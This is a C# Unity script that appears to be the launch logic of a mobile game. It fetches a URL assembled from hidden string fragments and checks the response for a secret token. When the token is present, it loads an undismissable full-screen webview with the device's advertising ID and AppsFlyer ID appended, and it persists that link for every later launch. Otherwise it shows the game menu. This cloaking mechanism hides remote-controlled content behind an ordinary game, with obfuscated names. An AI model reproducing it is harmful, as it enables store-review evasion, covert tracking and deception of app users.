using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainJJ : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odinJJName = "";
    [HideInInspector] public string dwaJJName = "";

    

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaJJ") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinJJName = advertisingId; });
        }
    }
    

    

    private IEnumerator IENUMENATORJJ()
    {
        using (UnityWebRequest jj = UnityWebRequest.Get(dwaJJName))
        {

            yield return jj.SendWebRequest();
            if (jj.isNetworkError)
            {
                GoingJJ();
            }
            int meadowsJJ = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && meadowsJJ > 0)
            {
                yield return new WaitForSeconds(1);
                meadowsJJ--;
            }
            try
            {
                if (jj.result == UnityWebRequest.Result.Success)
                {
                    if (jj.downloadHandler.text.Contains("JllbnJmprNXgYFGew"))
                    {

                        try
                        {
                            var subs = jj.downloadHandler.text.Split('|');
                            WEBJJLOOK(subs[0] + "?idfa=" + odinJJName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            WEBJJLOOK(jj.downloadHandler.text + "?idfa=" + odinJJName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoingJJ();
                    }
                }
                else
                {
                    GoingJJ();
                }
            }
            catch
            {
                GoingJJ();
            }
        }
    }

    


    private void GoingJJ()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Menu");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("FacilityJJlink", string.Empty) != string.Empty)
            {
                WEBJJLOOK(PlayerPrefs.GetString("FacilityJJlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dwaJJName += n;
                }
                StartCoroutine(IENUMENATORJJ());
            }
        }
        else
        {
            GoingJJ();
        }
    }
    private void WEBJJLOOK(string FacilityJJlink, string NamingJJ = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _shacklesJJ = gameObject.AddComponent<UniWebView>();
        _shacklesJJ.SetToolbarDoneButtonText("");
        switch (NamingJJ)
        {
            case "0":
                _shacklesJJ.SetShowToolbar(true, false, false, true);
                break;
            default:
                _shacklesJJ.SetShowToolbar(false);
                break;
        }
        _shacklesJJ.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _shacklesJJ.OnShouldClose += (view) =>
        {
            return false;
        };
        _shacklesJJ.SetSupportMultipleWindows(true);
        _shacklesJJ.SetAllowBackForwardNavigationGestures(true);
        _shacklesJJ.OnMultipleWindowOpened += (view, windowId) =>
        {
            _shacklesJJ.SetShowToolbar(true);

        };
        _shacklesJJ.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingJJ)
            {
                case "0":
                    _shacklesJJ.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _shacklesJJ.SetShowToolbar(false);
                    break;
            }
        };
        _shacklesJJ.OnOrientationChanged += (view, orientation) =>
        {
            _shacklesJJ.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _shacklesJJ.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("FacilityJJlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("FacilityJJlink", url);
            }
        };
        _shacklesJJ.Load(FacilityJJlink);
        _shacklesJJ.Show();
    }

}
